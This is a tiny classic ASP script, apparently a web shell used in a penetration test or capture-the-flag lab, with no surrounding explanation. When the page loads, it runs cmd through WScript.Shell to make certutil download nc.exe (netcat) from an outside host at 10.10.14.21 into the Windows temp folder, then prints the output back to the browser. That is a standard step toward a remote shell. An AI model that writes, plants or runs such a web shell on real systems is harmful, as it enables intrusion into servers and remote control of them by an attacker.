<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c certutil -urlcache -split -f http://10.10.14.21/nc.exe C:\\windows\temp\\nc.exe")
o = cmd.StdOut.Readall()
Response.write(o)
%>
